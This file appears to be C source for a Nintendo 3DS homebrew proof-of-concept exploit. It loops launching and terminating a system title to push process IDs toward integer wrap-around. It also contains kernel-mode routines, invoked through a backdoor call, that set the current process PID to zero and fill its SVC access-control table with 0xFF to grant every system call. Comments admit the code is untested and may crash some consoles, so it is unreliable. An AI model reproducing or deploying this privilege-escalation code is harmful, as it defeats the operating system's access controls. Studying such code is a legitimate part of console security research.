/*
Copyright (C) 2016 Toiry921

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include "stupidslowhax.h"


// May have used some from
// https://github.com/Steveice10/memchunkhax2/blob/master/source/memchunkhax2.c#L16

#define OLDNEW(x)                    (g_is_new3ds ? x ## _NEW : x ## _OLD)

#define CURRENT_KTHREAD              (*((u8**)0xFFFF9000))
#define CURRENT_KPROCESS             (*((u8**)0xFFFF9004))

#define SVC_ACL_SIZE                 (0x10)

#define KPROCESS_ACL_START_OLD       (0x88)
#define KPROCESS_ACL_START_NEW       (0x90)

#define KPROCESS_PID_OFFSET_OLD      (0xB4)
#define KPROCESS_PID_OFFSET_NEW      (0xBC)

#define KTHREAD_THREADPAGEPTR_OFFSET (0x8C)
#define KSVCTHREADAREA_BEGIN_OFFSET  (0xC8)


static bool g_is_new3ds = 0;
static u32 g_original_pid;

static void K_PatchPID(void)
{
	// Turn interrupts off
	__asm__ volatile("cpsid aif");

	u8 *proc = CURRENT_KPROCESS;
	u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));

	g_original_pid = *pidPtr;

	// We're now PID zero, all we have to do is reinitialize the service manager in user-mode.
	*pidPtr = 0;
}

static void K_RestorePID(void)
{
	// Turn interrupts off
	__asm__ volatile("cpsid aif");

	u8 *proc = CURRENT_KPROCESS;
	u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));

	// Restore the original PID
	*pidPtr = g_original_pid;
}

static void K_PatchACL(void)
{
	// Patch the process first (for newly created threads).
	u8 *proc = CURRENT_KPROCESS;
	u8 *procacl = proc + OLDNEW(KPROCESS_ACL_START);
	memset(procacl, 0xFF, SVC_ACL_SIZE);

	// Now patch the current thread.
	u8 *thread = CURRENT_KTHREAD;
	u8 *thread_pageend = *(u8**)(thread + KTHREAD_THREADPAGEPTR_OFFSET);
	u8 *thread_page = thread_pageend - KSVCTHREADAREA_BEGIN_OFFSET;
	memset(thread_page, 0xFF, SVC_ACL_SIZE);
}


void initsrv_allservices(void)
{
	printf("Patching PID\n");
	stupidslowhax_backdoor(K_PatchPID);

	printf("Reiniting srv:\n");
	srvExit();
	srvInit();

	// Not restoring the PID because we want it to stay like this if the next
	// started homebrew reinits srv or something similar.
	// Comment this return if you want/need to restore the PID.
	return;

	printf("Restoring PID\n");
	stupidslowhax_backdoor(K_RestorePID);
}

void patch_svcaccesstable(void)
{
	printf("Patching SVC access table\n");
	stupidslowhax_backdoor(K_PatchACL);
}

int main(int argc, char **argv)
{
	gfxInitDefault();
	consoleInit(GFX_TOP, NULL);
	osSetSpeedupEnable(true);

	Result res;

	printf("StuPID Slow Hax\n"); //Implementation of StuPID SlowHAX
	//POC - Takes about 2 weeks I think

	res=nsInit();
	printf("nsinit: %08X\n\n",(int)res);

	u64 titleid=0x0004001000024000; //PromoVideo, US O3DS
	//titleid=0x000400102002D500;
	u32 procid; //assume Nintendo is using s32
	u32 launch_flags=0; // -\_(シ)_/-
	//u32 target=0x100
	u32 target=0x7FFFFFFF-1; //(s32 max - 1)
	// PID cut-off. After exiting App then loading HomeBrewMenu, next app should launch with cut-off + 2 based on test with lower target PIDs/
	// In theory should launch 3ds_dsiwarehax_installer by Yellows8("https://github.com/yellows8/3ds_dsiwarehax_installer") with an s32 wrap at PID 0, so 3ds_dsiwarehax_installer has dull SVC access
	// Estimated to take 2 weeks to reach cut-off. Umm I don't have time to test :/
	// Doesn't seem to work as well on N3DS systems, Relaunching systemapps can lead to PID not advancing or Memory Crashes

	for(u32 i=0 ; i<0x80000000 ; i++){
				NS_LaunchTitle(titleid, launch_flags, &procid); //loop until PID is right next to s32 wrap-around
				printf("%08X\n",(int)procid);
				NS_TerminateProcessTID(titleid);
				if(procid>=target)break;
	}
	nsExit();
	printf("\n%08X  Current PID\n",(int)procid);
	printf(  "%08X  Target  PID\n",(int)procid+2);
	printf(  "Start to exit, then run another app requireing services :^) "); //need to launch 3ds_dsiware_installer with an XML to takeover some otherapp or PID will be download play (TOO LOW)

	while (aptMainLoop())
	{

		hidScanInput();
		u32 kDown = hidKeysDown();
		if (kDown & KEY_START) break;

		if (kDown & KEY_A){

		}

		gfxFlushBuffers();
		gfxSwapBuffers();

		gspWaitForVBlank();
	}

	gfxExit();
	return 0;
}